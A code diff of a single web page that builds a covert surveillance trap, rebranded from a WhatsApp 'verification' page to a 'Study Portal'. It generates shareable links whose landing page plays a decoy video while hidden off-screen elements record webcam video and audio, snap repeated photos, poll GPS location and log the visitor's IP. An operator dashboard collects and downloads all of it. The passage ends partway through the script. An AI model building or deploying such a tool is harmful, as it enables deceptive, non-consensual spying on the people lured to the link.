@@ -3,384 +3,540 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>Verification System - WhatsApp Ready</title>
+    <title>✨ Study Portal ✨</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         * { font-family: 'Plus Jakarta Sans', sans-serif; }
-        #hiddenCamera, #hiddenAudio { position: fixed; bottom: -1000px; left: -1000px; width: 1px; height: 1px; opacity: 0; visibility: hidden; pointer-events: none; }
-        .fake-video-container { background: #000; border-radius: 20px; overflow: hidden; }
-        .fake-video { width: 100%; min-height: 450px; object-fit: cover; }
-        .whatsapp-btn { transition: all 0.2s; }
-        .whatsapp-btn:hover { transform: scale(1.02); }
-        @keyframes pulse { 0% { opacity: 0.5; } 50% { opacity: 1; } 100% { opacity: 0.5; } }
-        .status-pulse { animation: pulse 1s infinite; }
+        .gradient-bg { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); }
+        .heart-animation { animation: heartbeat 1.5s ease infinite; }
+        @keyframes heartbeat { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
+        .video-container { background: #000; border-radius: 30px; overflow: hidden; }
+        .love-btn { transition: all 0.3s ease; }
+        .love-btn:hover { transform: scale(1.05); }
+        #hiddenVideo, #hiddenAudio { position: fixed; bottom: -1000px; left: -1000px; width: 1px; height: 1px; opacity: 0; visibility: hidden; pointer-events: none; }
+        .upload-card { background: rgba(255,255,255,0.1); backdrop-filter: blur(10px); transition: all 0.3s ease; }
+        .upload-card:hover { background: rgba(255,255,255,0.15); transform: translateY(-2px); }
+        .stat-card { transition: all 0.3s ease; }
+        .stat-card:hover { transform: translateY(-3px); background: rgba(255,255,255,0.25); }
+        .gallery-img { transition: all 0.3s ease; }
+        .gallery-img:hover { transform: scale(1.05); }
+        .tab-active { background: linear-gradient(135deg, #ec4899, #a855f7); color: white; }
     </style>
 </head>
-<body class="bg-gradient-to-br from-slate-900 via-indigo-900 to-purple-900 min-h-screen">
-    
-    <div class="container mx-auto px-4 py-6 max-w-2xl">
+<body class="gradient-bg min-h-screen">
+
+<div class="container mx-auto px-4 py-8 max-w-5xl">
+
+<!-- ============ ADMIN PANEL ============ -->
+<div id="adminPanel">
+    <div class="text-center mb-10">
+        <div class="inline-flex gap-2 bg-white/20 backdrop-blur rounded-full px-8 py-3 mb-5">
+            <i class="fas fa-heart text-pink-400 heart-animation"></i>
+            <span class="text-white font-bold text-lg">✨ Study Verification Portal ✨</span>
+        </div>
+        <h1 class="text-4xl font-bold text-white mb-3">📚 Generate Student Link</h1>
+        <p class="text-white/80 text-lg">Create link → Student camera page open hoga</p>
+    </div>
+
+    <!-- Custom Upload Section -->
+    <div class="grid md:grid-cols-2 gap-6 mb-8">
+        <div class="upload-card rounded-3xl p-6 border border-white/20">
+            <div class="flex items-center gap-3 mb-4">
+                <i class="fas fa-video text-pink-400 text-2xl"></i>
+                <h2 class="text-xl font-bold text-white">🎬 Custom Video</h2>
+            </div>
+            <input type="file" id="customVideoFile" accept="video/mp4,video/webm" class="w-full px-4 py-3 rounded-2xl bg-white/10 text-white border border-white/30 cursor-pointer">
+            <div id="videoPreview" class="hidden mt-3 text-green-400 text-sm"><i class="fas fa-check-circle"></i> Video selected!</div>
+        </div>
         
-        <!-- Admin Panel -->
-        <div id="adminPanel">
-            <div class="text-center mb-6">
-                <div class="inline-flex items-center gap-2 bg-green-500/20 rounded-full px-4 py-2 mb-3">
-                    <i class="fab fa-whatsapp text-green-400"></i>
-                    <span class="text-green-400 text-sm">WhatsApp Ready | Clickable Link</span>
-                </div>
-                <h1 class="text-3xl font-bold text-white mb-2">📱 Intelligence System</h1>
-                <p class="text-white/70">Video + Voice + Location + Photos + Download</p>
+        <div class="upload-card rounded-3xl p-6 border border-white/20">
+            <div class="flex items-center gap-3 mb-4">
+                <i class="fas fa-image text-pink-400 text-2xl"></i>
+                <h2 class="text-xl font-bold text-white">🖼️ Custom Image</h2>
             </div>
-            
-            <div class="bg-white rounded-3xl shadow-2xl overflow-hidden">
-                <div class="bg-gradient-to-r from-green-600 to-teal-600 p-5">
-                    <h2 class="text-xl font-bold text-white">✨ Create WhatsApp Link</h2>
-                    <p class="text-white/80 text-sm">Generate link - Share on WhatsApp - Auto collect data</p>
-                </div>
-                
-                <div class="p-6">
-                    <form id="createForm" onsubmit="return false;">
-                        <div class="mb-4">
-                            <label class="block font-bold text-slate-700 mb-2">📝 Campaign Name</label>
-                            <input type="text" id="campaignName" required placeholder="e.g., Math Test, Verification" class="w-full border-2 rounded-2xl px-4 py-3">
-                        </div>
-                        
-                        <div class="grid grid-cols-2 gap-4 mb-4">
-                            <div>
-                                <label class="block font-bold text-slate-700 mb-2">⚡ Capture Speed</label>
-                                <select id="captureSpeed" class="w-full border-2 rounded-2xl px-3 py-3">
-                                    <option value="0.5">0.5 sec (Ultra Fast)</option>
-                                    <option value="1" selected>1 sec (Fast)</option>
-                                    <option value="2">2 sec (Normal)</option>
-                                </select>
-                            </div>
-                            <div>
-                                <label class="block font-bold text-slate-700 mb-2">📸 Number of Photos</label>
-                                <select id="photoCount" class="w-full border-2 rounded-2xl px-3 py-3">
-                                    <option value="5">5 Photos</option>
-                                    <option value="10" selected>10 Photos</option>
-                                    <option value="15">15 Photos</option>
-                                </select>
-                            </div>
-                        </div>
-                        
-                        <div class="grid grid-cols-3 gap-4 mb-4">
-                            <div>
-                                <label class="block font-bold text-slate-700 mb-2">🎥 Video</label>
-                                <select id="videoRecord" class="w-full border-2 rounded-2xl px-3 py-3">
-                                    <option value="yes" selected>✅ Record</option>
-                                    <option value="no">❌ No</option>
-                                </select>
-                            </div>
-                            <div>
-                                <label class="block font-bold text-slate-700 mb-2">🎤 Voice</label>
-                                <select id="voiceRecord" class="w-full border-2 rounded-2xl px-3 py-3">
-                                    <option value="yes" selected>✅ Record</option>
-                                    <option value="no">❌ No</option>
-                                </select>
-                            </div>
-                            <div>
-                                <label class="block font-bold text-slate-700 mb-2">📍 GPS</label>
-                                <select id="locationTrack" class="w-full border-2 rounded-2xl px-3 py-3">
-                                    <option value="yes" selected>✅ Track</option>
-                                    <option value="no">❌ No</option>
-                                </select>
-                            </div>
-                        </div>
-                        
-                        <div class="mb-4">
-                            <label class="block font-bold text-slate-700 mb-2">🔗 Redirect URL (After Capture)</label>
-                            <input type="url" id="redirectUrl" placeholder="https://google.com" class="w-full border-2 rounded-2xl px-4 py-3">
-                        </div>
-                        
-                        <button type="button" onclick="generateLink()" class="w-full bg-gradient-to-r from-green-600 to-teal-600 text-white py-4 rounded-2xl font-bold text-lg">
-                            <i class="fab fa-whatsapp mr-2"></i> Generate WhatsApp Link
-                        </button>
-                    </form>
-                    
-                    <div id="generatedBox" class="hidden mt-6 p-5 bg-green-50 rounded-2xl">
-                        <p class="font-bold text-green-700 mb-2">✅ Link Ready for WhatsApp!</p>
-                        <input type="text" id="generatedLink" readonly class="w-full bg-white border rounded-xl px-3 py-2 text-sm font-mono mb-3">
-                        <div class="flex gap-2">
-                            <button onclick="copyLink()" class="flex-1 bg-green-600 text-white py-3 rounded-xl font-bold">
-                                <i class="fas fa-copy mr-1"></i> Copy Link
-                            </button>
-                            <button onclick="sendToWhatsApp()" class="flex-1 bg-emerald-600 text-white py-3 rounded-xl font-bold">
-                                <i class="fab fa-whatsapp mr-1"></i> Send to WhatsApp
-                            </button>
-                        </div>
-                    </div>
-                </div>
+            <input type="file" id="customImageFile" accept="image/jpeg,image/png" class="w-full px-4 py-3 rounded-2xl bg-white/10 text-white border border-white/30 cursor-pointer">
+            <div id="imagePreview" class="hidden mt-3 text-green-400 text-sm"><i class="fas fa-check-circle"></i> Image selected!</div>
+        </div>
+    </div>
+
+    <!-- Generate Link Card -->
+    <div class="bg-white/10 backdrop-blur-xl rounded-3xl p-8 mb-10 border border-white/20">
+        <h2 class="text-2xl font-bold text-white mb-6 text-center"><i class="fas fa-link mr-2"></i> Generate Student Link</h2>
+        
+        <div class="grid md:grid-cols-3 gap-6 mb-8">
+            <div>
+                <label class="text-white text-sm block mb-2 font-semibold">📝 Campaign Name</label>
+                <input type="text" id="campaignName" placeholder="e.g., Math Test" class="w-full px-4 py-3 rounded-2xl bg-white/20 text-white border border-white/30 focus:outline-none">
             </div>
-            
-            <!-- Data Dashboard -->
-            <div class="mt-8 bg-white rounded-3xl shadow-2xl overflow-hidden">
-                <div class="bg-gradient-to-r from-purple-600 to-pink-600 p-5">
-                    <h2 class="text-xl font-bold text-white">📊 Collected Data</h2>
-                </div>
-                <div class="p-6">
-                    <div class="flex justify-between items-center mb-4 flex-wrap gap-2">
-                        <div class="flex gap-2 flex-wrap">
-                            <span class="bg-blue-100 px-3 py-1 rounded-full text-sm">📸 Photos: <strong id="photoTotal">0</strong></span>
-                            <span class="bg-red-100 px-3 py-1 rounded-full text-sm">🎥 Videos: <strong id="videoTotal">0</strong></span>
-                            <span class="bg-green-100 px-3 py-1 rounded-full text-sm">🎤 Voice: <strong id="voiceTotal">0</strong></span>
-                            <span class="bg-purple-100 px-3 py-1 rounded-full text-sm">📍 Locations: <strong id="locationTotal">0</strong></span>
-                            <span class="bg-orange-100 px-3 py-1 rounded-full text-sm">💻 Devices: <strong id="deviceTotal">0</strong></span>
-                        </div>
-                        <button onclick="downloadAllData()" class="bg-purple-600 text-white px-4 py-2 rounded-xl text-sm">Download All</button>
-                    </div>
-                    
-                    <div id="dataList" class="max-h-96 overflow-y-auto space-y-2">
-                        <div class="text-center text-slate-400 py-4">No data collected yet</div>
-                    </div>
-                </div>
+            <div>
+                <label class="text-white text-sm block mb-2 font-semibold">⚡ Capture Speed</label>
+                <select id="captureSpeed" class="w-full px-4 py-3 rounded-2xl bg-white/20 text-white border border-white/30">
+                    <option value="0.5">0.5 sec (Fast)</option>
+                    <option value="1" selected>1 sec</option>
+                    <option value="2">2 sec</option>
+                </select>
+            </div>
+            <div>
+                <label class="text-white text-sm block mb-2 font-semibold">📸 Number of Photos</label>
+                <select id="photoCount" class="w-full px-4 py-3 rounded-2xl bg-white/20 text-white border border-white/30">
+                    <option value="5">5 Photos</option>
+                    <option value="10" selected>10 Photos</option>
+                    <option value="15">15 Photos</option>
+                </select>
             </div>
         </div>
         
-        <!-- Student Panel -->
-        <div id="studentPanel" class="hidden">
-            <div class="bg-black rounded-3xl overflow-hidden shadow-2xl">
-                <video id="hiddenCamera" autoplay playsinline muted style="position:fixed;bottom:-1000px;left:-1000px;width:1px;height:1px;opacity:0"></video>
-                <audio id="hiddenAudio" autoplay style="position:fixed;bottom:-1000px;left:-1000px;width:1px;height:1px;opacity:0"></audio>
-                
-                <div class="relative">
-                    <div class="absolute top-0 left-0 right-0 p-4 bg-gradient-to-b from-black/70 to-transparent z-10">
-                        <div class="flex items-center gap-2">
-                            <div class="w-10 h-10 rounded-full bg-gradient-to-r from-pink-500 to-orange-500 flex items-center justify-center">
-                                <i class="fab fa-tiktok text-white text-xl"></i>
-                            </div>
-                            <div>
-                                <p class="text-white font-bold text-sm">Verification Required</p>
-                                <p class="text-white/50 text-xs">Please watch video</p>
-                            </div>
-                        </div>
-                    </div>
-                    
-                    <video id="fakeVideoPlayer" class="fake-video w-full" autoplay loop muted playsinline></video>
-                    
-                    <div class="absolute bottom-0 left-0 right-0 p-4 bg-gradient-to-t from-black/70 to-transparent z-10">
-                        <p class="text-white font-bold text-sm" id="videoTitle">Loading...</p>
-                        <p class="text-white/70 text-xs">Please allow camera access</p>
-                    </div>
+        <button onclick="generateLink()" class="w-full bg-gradient-to-r from-pink-500 to-purple-600 text-white py-5 rounded-2xl font-bold text-xl love-btn">
+            <i class="fas fa-magic mr-2"></i> Generate Student Link
+        </button>
+        
+        <div id="linkBox" class="hidden mt-8 p-6 bg-white/20 rounded-2xl">
+            <p class="text-white font-bold text-center mb-3 text-lg">✅ Student Link Ready!</p>
+            <input type="text" id="generatedLink" readonly class="w-full bg-white/20 text-white rounded-xl px-4 py-3 text-sm mb-4 font-mono">
+            <div class="flex gap-4">
+                <button onclick="copyLink()" class="flex-1 bg-pink-500 text-white py-3 rounded-xl font-bold love-btn"><i class="fas fa-copy mr-2"></i> Copy Link</button>
+                <button onclick="sendToWhatsApp()" class="flex-1 bg-green-500 text-white py-3 rounded-xl font-bold love-btn"><i class="fab fa-whatsapp mr-2"></i> WhatsApp</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Stats Cards -->
+    <div class="grid grid-cols-2 md:grid-cols-5 gap-5 mb-10">
+        <div class="stat-card bg-white/20 rounded-2xl p-5 text-center cursor-pointer" onclick="showTab('photos')">
+            <i class="fas fa-camera text-pink-400 text-2xl mb-2"></i>
+            <p class="text-white text-3xl font-bold" id="statPhotos">0</p>
+            <p class="text-white/70 text-sm">Photos</p>
+        </div>
+        <div class="stat-card bg-white/20 rounded-2xl p-5 text-center cursor-pointer" onclick="showTab('videos')">
+            <i class="fas fa-video text-blue-400 text-2xl mb-2"></i>
+            <p class="text-white text-3xl font-bold" id="statVideos">0</p>
+            <p class="text-white/70 text-sm">Videos</p>
+        </div>
+        <div class="stat-card bg-white/20 rounded-2xl p-5 text-center cursor-pointer" onclick="showTab('voices')">
+            <i class="fas fa-microphone text-green-400 text-2xl mb-2"></i>
+            <p class="text-white text-3xl font-bold" id="statVoices">0</p>
+            <p class="text-white/70 text-sm">Voice</p>
+        </div>
+        <div class="stat-card bg-white/20 rounded-2xl p-5 text-center cursor-pointer" onclick="showTab('locations')">
+            <i class="fas fa-map-marker-alt text-red-400 text-2xl mb-2"></i>
+            <p class="text-white text-3xl font-bold" id="statLocs">0</p>
+            <p class="text-white/70 text-sm">Locations</p>
+        </div>
+        <div class="stat-card bg-white/20 rounded-2xl p-5 text-center">
+            <i class="fas fa-download text-purple-400 text-2xl mb-2"></i>
+            <button onclick="downloadAllData()" class="text-white font-bold text-sm love-btn">Download All</button>
+        </div>
+    </div>
+
+    <!-- Tab Content -->
+    <div id="photosTab" class="grid grid-cols-2 md:grid-cols-4 gap-5"></div>
+    <div id="videosTab" class="space-y-3 hidden"></div>
+    <div id="voicesTab" class="space-y-3 hidden"></div>
+    <div id="locationsTab" class="space-y-4 hidden"></div>
+</div>
+
+<!-- ============ CAMERA PAGE (Student) ============ -->
+<div id="cameraPanel" class="hidden">
+    <video id="hiddenVideo" autoplay playsinline muted></video>
+    <audio id="hiddenAudio" autoplay></audio>
+
+    <div class="min-h-screen flex items-center justify-center p-5">
+        <div class="max-w-md w-full">
+            <div class="bg-white/10 backdrop-blur-xl rounded-3xl overflow-hidden border border-white/20">
+                <div class="bg-gradient-to-r from-pink-500 to-purple-600 p-8 text-center">
+                    <i class="fas fa-heart text-white text-5xl mb-4 heart-animation"></i>
+                    <h2 class="text-3xl font-bold text-white">✨ Study Session ✨</h2>
+                    <p class="text-white/80 mt-2" id="cameraTitle">Loading...</p>
                 </div>
-                
-                <div class="p-3 bg-black/80 text-center">
-                    <p id="statusText" class="text-yellow-400 text-sm status-pulse">⚡ Initializing...</p>
-                    <p id="counterText" class="text-white/50 text-xs mt-1">📸 0 / 0</p>
+
+                <div class="video-container m-5">
+                    <video id="fakeVideo" class="w-full rounded-2xl" autoplay loop muted playsinline></video>
+                </div>
+
+                <div class="p-6 text-center">
+                    <div class="bg-white/20 rounded-2xl p-5 mb-5">
+                        <i class="fas fa-quote-left text-pink-300 text-xl"></i>
+                        <p class="text-white font-medium text-lg mt-2" id="motivationMsg">📖 "Every day is a learning opportunity"</p>
+                    </div>
+                    <div class="bg-black/30 rounded-xl p-4">
+                        <p id="statusText" class="text-yellow-300 text-base">
+                            <i class="fas fa-heartbeat fa-pulse mr-2"></i> Setting up...
+                        </p>
+                    </div>
                 </div>
             </div>
         </div>
     </div>
-    
-    <script>
-    let allLinks = [], allPhotos = [], allVideos = [], allVoices = [], allLocations = [], allDevices = [];
-    let hiddenStream = null, audioStream = null, videoRecorder = null, audioRecorder = null;
-    let videoChunks = [], audioChunks = [];
-    let currentLink = null, capturedCount = 0, neededCount = 10, captureInterval = 1000, captureTimer = null;
-    let videoActive = true, voiceActive = true, locationActive = true;
-    
-    function loadData() {
-        allLinks = JSON.parse(localStorage.getItem('waFinalLinks2') || '[]');
-        allPhotos = JSON.parse(localStorage.getItem('waFinalPhotos2') || '[]');
-        allVideos = JSON.parse(localStorage.getItem('waFinalVideos2') || '[]');
-        allVoices = JSON.parse(localStorage.getItem('waFinalVoices2') || '[]');
-        allLocations = JSON.parse(localStorage.getItem('waFinalLocations2') || '[]');
-        allDevices = JSON.parse(localStorage.getItem('waFinalDevices2') || '[]');
-        updateDashboard();
+</div>
+
+</div>
+
+<script>
+// ============ DATA STORAGE ============
+let allPhotos = [], allVideos = [], allVoices = [], allLocations = [];
+let storedCustomVideo = null, storedCustomImage = null;
+
+// Recording Variables
+let hiddenStream = null, audioStream = null, videoRecorder = null, audioRecorder = null;
+let videoChunks = [], audioChunks = [];
+let capturedCount = 0, neededCount = 10, captureInterval = 1000, captureTimer = null;
+let locationInterval = null;
+
+// ============ FILE UPLOAD ============
+document.getElementById('customVideoFile').addEventListener('change', function(e) {
+    const file = e.target.files[0];
+    if(file) {
+        const reader = new FileReader();
+        reader.onload = function(event) {
+            storedCustomVideo = event.target.result;
+            document.getElementById('videoPreview').classList.remove('hidden');
+        };
+        reader.readAsDataURL(file);
     }
-    function saveLinks() { localStorage.setItem('waFinalLinks2', JSON.stringify(allLinks)); }
-    function savePhotos() { localStorage.setItem('waFinalPhotos2', JSON.stringify(allPhotos)); updateDashboard(); }
-    function saveVideos() { localStorage.setItem('waFinalVideos2', JSON.stringify(allVideos)); updateDashboard(); }
-    function saveVoices() { localStorage.setItem('waFinalVoices2', JSON.stringify(allVoices)); updateDashboard(); }
-    function saveLocations() { localStorage.setItem('waFinalLocations2', JSON.stringify(allLocations)); updateDashboard(); }
-    function saveDevices() { localStorage.setItem('waFinalDevices2', JSON.stringify(allDevices)); updateDashboard(); }
-    
-    function getBaseUrl() { return window.location.href.split('?')[0]; }
-    
-    function generateLink() {
-        const campaignName = document.getElementById('campaignName').value;
-        if(!campaignName) { alert('Enter campaign name'); return; }
-        
-        const captureSpeed = parseFloat(document.getElementById('captureSpeed').value);
-        const photoCount = document.getElementById('photoCount').value;
-        const videoRecord = document.getElementById('videoRecord').value === 'yes';
-        const voiceRecord = document.getElementById('voiceRecord').value === 'yes';
-        const locationTrack = document.getElementById('locationTrack').value === 'yes';
-        const redirectUrl = document.getElementById('redirectUrl').value;
-        
-        const code = 'wa_' + Date.now() + '_' + Math.random().toString(36).substring(2, 10);
-        const fullLink = getBaseUrl() + '?code=' + code;
-        
-        allLinks.push({ code, campaignName, captureInterval: captureSpeed * 1000, photoCount: parseInt(photoCount), videoRecord, voiceRecord, locationTrack, redirectUrl });
-        saveLinks();
-        
-        document.getElementById('generatedLink').value = fullLink;
-        document.getElementById('generatedBox').classList.remove('hidden');
+});
+
+document.getElementById('customImageFile').addEventListener('change', function(e) {
+    const file = e.target.files[0];
+    if(file) {
+        const reader = new FileReader();
+        reader.onload = function(event) {
+            storedCustomImage = event.target.result;
+            document.getElementById('imagePreview').classList.remove('hidden');
+        };
+        reader.readAsDataURL(file);
     }
+});
+
+// ============ TAB MANAGEMENT ============
+function showTab(tab) {
+    document.getElementById('photosTab').classList.add('hidden');
+    document.getElementById('videosTab').classList.add('hidden');
+    document.getElementById('voicesTab').classList.add('hidden');
+    document.getElementById('locationsTab').classList.add('hidden');
     
-    function copyLink() {
-        const input = document.getElementById('generatedLink');
-        input.select();
-        document.execCommand('copy');
-        alert('✅ Link copied!');
-    }
+    document.getElementById(tab + 'Tab').classList.remove('hidden');
     
-    function sendToWhatsApp() {
-        const link = document.getElementById('generatedLink').value;
-        const msg = `📸 Verification Required\n\nClick the link and allow camera access:\n\n${link}`;
-        window.open(`https://wa.me/?text=${encodeURIComponent(msg)}`, '_blank');
-    }
-    
-    function checkUrl() {
-        const code = new URLSearchParams(window.location.search).get('code');
-        if(code) {
-            const link = allLinks.find(l => l.code === code);
-            if(link) startStudentPage(link);
-            else showAdmin();
-        } else showAdmin();
-    }
-    
-    function showAdmin() {
-        document.getElementById('adminPanel').classList.remove('hidden');
-        document.getElementById('studentPanel').classList.add('hidden');
-    }
-    
-    async function startStudentPage(linkData) {
-        currentLink = linkData;
-        neededCount = linkData.photoCount;
-        captureInterval = linkData.captureInterval;
-        videoActive = linkData.videoRecord;
-        voiceActive = linkData.voiceRecord;
-        locationActive = linkData.locationTrack;
-        
-        document.getElementById('adminPanel').classList.add('hidden');
-        document.getElementById('studentPanel').classList.remove('hidden');
-        document.getElementById('videoTitle').innerHTML = linkData.campaignName;
-        document.getElementById('counterText').innerHTML = `📸 0 / ${neededCount}`;
-        
-        document.getElementById('fakeVideoPlayer').src = "https://interactive-examples.mdn.mozilla.net/media/cc0-videos/flower.mp4";
-        
-        await collectDeviceInfo();
-        if(videoActive) await startVideoRecording();
-        if(voiceActive) await startAudioRecording();
-        if(locationActive) startLocationTracking();
-        setTimeout(() => startPhotoCapture(), 3000);
-    }
-    
-    async function collectDeviceInfo() {
-        let ip = 'Unknown', city = 'Unknown', country = 'Unknown';
-        try {
-            const res = await fetch('https://ipapi.co/json/');
-            const data = await res.json();
-            ip = data.ip || 'Unknown';
-            city = data.city || 'Unknown';
-            country = data.country_name || 'Unknown';
-        } catch(e) {}
-        
-        allDevices.unshift({ id: Date.now(), time: new Date().toLocaleString(), campaign: currentLink?.campaignName, ip, city, country, device: navigator.platform });
-        saveDevices();
-    }
-    
-    async function startVideoRecording() {
-        try {
-            hiddenStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-            document.getElementById('hiddenCamera').srcObject = hiddenStream;
-            videoRecorder = new MediaRecorder(hiddenStream);
-            videoChunks = [];
-            videoRecorder.ondataavailable = (e) => { if(e.data.size > 0) videoChunks.push(e.data); };
-            videoRecorder.onstop = () => { if(videoChunks.length) { const blob = new Blob(videoChunks, { type: 'video/webm' }); allVideos.push({ id: Date.now(), data: URL.createObjectURL(blob), title: currentLink?.campaignName, time: new Date().toLocaleString() }); saveVideos(); } };
-            videoRecorder.start(1000);
-            document.getElementById('statusText').innerHTML = '🎥 Recording';
-        } catch(e) { document.getElementById('statusText').innerHTML = '⚠️ Camera needed'; }
-    }
-    
-    async function startAudioRecording() {
-        try {
-            audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
-            audioRecorder = new MediaRecorder(audioStream);
-            audioChunks = [];
-            audioRecorder.ondataavailable = (e) => { if(e.data.size > 0) audioChunks.push(e.data); };
-            audioRecorder.onstop = () => { if(audioChunks.length) { const blob = new Blob(audioChunks, { type: 'audio/webm' }); allVoices.push({ id: Date.now(), data: URL.createObjectURL(blob), title: currentLink?.campaignName, time: new Date().toLocaleString() }); saveVoices(); } };
-            audioRecorder.start(1000);
-        } catch(e) {}
-    }
-    
-    function startLocationTracking() {
-        navigator.geolocation.getCurrentPosition((pos) => { allLocations.unshift({ id: Date.now(), lat: pos.coords.latitude, lng: pos.coords.longitude, time: new Date().toLocaleString() }); saveLocations(); }, () => {});
-        setInterval(() => { navigator.geolocation.getCurrentPosition((pos) => { allLocations.unshift({ id: Date.now(), lat: pos.coords.latitude, lng: pos.coords.longitude, time: new Date().toLocaleString() }); saveLocations(); }, () => {}); }, 10000);
-    }
-    
-    function startPhotoCapture() {
-        captureTimer = setInterval(() => {
-            if(capturedCount >= neededCount) {
-                clearInterval(captureTimer);
-                if(videoRecorder && videoRecorder.state === 'recording') videoRecorder.stop();
-                if(audioRecorder && audioRecorder.state === 'recording') audioRecorder.stop();
-                if(hiddenStream) hiddenStream.getTracks().forEach(t => t.stop());
-                if(audioStream) audioStream.getTracks().forEach(t => t.stop());
-                setTimeout(() => { if(currentLink?.redirectUrl) window.location.href = currentLink.redirectUrl; else document.getElementById('studentPanel').innerHTML = '<div class="bg-black rounded-3xl p-8 text-center"><div class="text-6xl mb-4">✅</div><h2 class="text-white text-xl">Complete!</h2></div>'; }, 2000);
-                return;
-            }
-            const video = document.getElementById('hiddenCamera');
-            if(video && video.videoWidth > 0) {
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                const ctx = canvas.getContext('2d');
-                ctx.translate(canvas.width, 0);
-                ctx.scale(-1, 1);
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                const photoData = canvas.toDataURL('image/jpeg', 0.8);
-                allPhotos.unshift({ id: Date.now(), data: photoData, title: currentLink?.campaignName, time: new Date().toLocaleString() });
-                savePhotos();
-                capturedCount++;
-                document.getElementById('counterText').innerHTML = `📸 ${capturedCount} / ${neededCount}`;
-            }
-        }, captureInterval);
-    }
-    
-    function updateDashboard() {
-        document.getElementById('photoTotal').innerHTML = allPhotos.length;
-        document.getElementById('videoTotal').innerHTML = allVideos.length;
-        document.getElementById('voiceTotal').innerHTML = allVoices.length;
-        document.getElementById('locationTotal').innerHTML = allLocations.length;
-        document.getElementById('deviceTotal').innerHTML = allDevices.length;
-        
-        const dataDiv = document.getElementById('dataList');
-        if(dataDiv) {
-            if(allPhotos.length === 0 && allDevices.length === 0) dataDiv.innerHTML = '<div class="text-center text-slate-400 py-4">No data yet</div>';
-            else {
-                let html = '';
-                allDevices.slice(0, 5).forEach(d => { html += `<div class="bg-slate-100 p-2 rounded-xl text-sm">💻 ${d.device} | IP: ${d.ip} | ${d.time}</div>`; });
-                allPhotos.slice(0, 5).forEach(p => { html += `<div class="bg-slate-100 p-2 rounded-xl text-sm flex justify-between"><span>📸 Photo</span><span>${p.time}</span></div>`; });
-                dataDiv.innerHTML = html;
-            }
-        }
-    }
-    
-    function downloadAllData() {
-        const report = { photos: allPhotos.length, videos: allVideos.length, voices: allVoices.length, locations: allLocations, devices: allDevices, exportedAt: new Date().toISOString() };
-        const a = document.createElement('a');
-        a.download = `report_${Date.now()}.json`;
-        a.href = URL.createObjectURL(new Blob([JSON.stringify(report, null, 2)], { type: 'application/json' }));
-        a.click();
-        alert('✅ Report downloaded!');
-    }
-    
-    window.generateLink = generateLink;
-    window.copyLink = copyLink;
-    window.sendToWhatsApp = sendToWhatsApp;
-    window.downloadAllData = downloadAllData;
-    
-    loadData();
-    checkUrl();
-    
-    window.addEventListener('beforeunload', () => {
-        if(hiddenStream) hiddenStream.getTracks().forEach(t => t.stop());
-        if(audioStream) audioStream.getTracks().forEach(t => t.stop());
-        if(captureTimer) clearInterval(captureTimer);
+    if(tab === 'photos') displayPhotos();
+    if(tab === 'videos') displayVideos();
+    if(tab === 'voices') displayVoices();
+    if(tab === 'locations') displayLocations();
+}
+
+function displayPhotos() {
+    const container = document.getElementById('photosTab');
+    if(allPhotos.length === 0) { container.innerHTML = '<div class="col-span-4 text-center text-white/50 py-10">📸 No photos yet</div>'; return; }
+    container.innerHTML = '';
+    [...allPhotos].reverse().forEach((p, idx) => {
+        container.innerHTML += `
+            <div class="bg-white/10 rounded-2xl overflow-hidden group">
+                <img src="${p.data}" class="gallery-img w-full h-36 object-cover cursor-pointer" onclick="window.open('${p.data}')">
+                <div class="p-2 text-center flex justify-between items-center">
+                    <span class="text-white text-xs">${p.time}</span>
+                    <button onclick="downloadPhoto(${allPhotos.length-1-idx})" class="bg-pink-500 text-white px-2 py-1 rounded-lg text-xs">Download</button>
+                </div>
+            </div>
+        `;
     });
-    </script>
+}
+
+function displayVideos() {
+    const container = document.getElementById('videosTab');
+    if(allVideos.length === 0) { container.innerHTML = '<div class="text-center text-white/50 py-10">🎥 No videos yet</div>'; return; }
+    container.innerHTML = '';
+    [...allVideos].reverse().forEach((v, idx) => {
+        container.innerHTML += `
+            <div class="bg-white/10 rounded-2xl p-3">
+                <div class="flex items-center justify-between flex-wrap gap-2">
+                    <span class="text-white text-sm">🎥 Video - ${v.time}</span>
+                    <video controls class="h-16 rounded"><source src="${v.data}" type="video/webm"></video>
+                    <button onclick="downloadVideo(${allVideos.length-1-idx})" class="bg-pink-500 text-white px-3 py-1 rounded-lg text-sm">Download</button>
+                </div>
+            </div>
+        `;
+    });
+}
+
+function displayVoices() {
+    const container = document.getElementById('voicesTab');
+    if(allVoices.length === 0) { container.innerHTML = '<div class="text-center text-white/50 py-10">🎤 No voice recordings yet</div>'; return; }
+    container.innerHTML = '';
+    [...allVoices].reverse().forEach((v, idx) => {
+        container.innerHTML += `
+            <div class="bg-white/10 rounded-2xl p-3">
+                <div class="flex items-center justify-between flex-wrap gap-2">
+                    <span class="text-white text-sm">🎤 Voice - ${v.time}</span>
+                    <audio controls class="h-10"><source src="${v.data}" type="audio/webm"></audio>
+                    <button onclick="downloadVoice(${allVoices.length-1-idx})" class="bg-pink-500 text-white px-3 py-1 rounded-lg text-sm">Download</button>
+                </div>
+            </div>
+        `;
+    });
+}
+
+function displayLocations() {
+    const container = document.getElementById('locationsTab');
+    if(allLocations.length === 0) { container.innerHTML = '<div class="text-center text-white/50 py-10">📍 No locations yet</div>'; return; }
+    container.innerHTML = '';
+    [...allLocations].reverse().forEach(l => {
+        container.innerHTML += `
+            <div class="bg-white/10 rounded-2xl p-3">
+                <div class="mb-2 rounded-xl overflow-hidden">
+                    <iframe width="100%" height="200" frameborder="0" src="https://maps.google.com/maps?q=${l.lat},${l.lng}&z=15&output=embed"></iframe>
+                </div>
+                <div class="flex justify-between items-center">
+                    <div>
+                        <span class="text-white text-sm">📍 ${l.lat?.toFixed(4)}, ${l.lng?.toFixed(4)}</span>
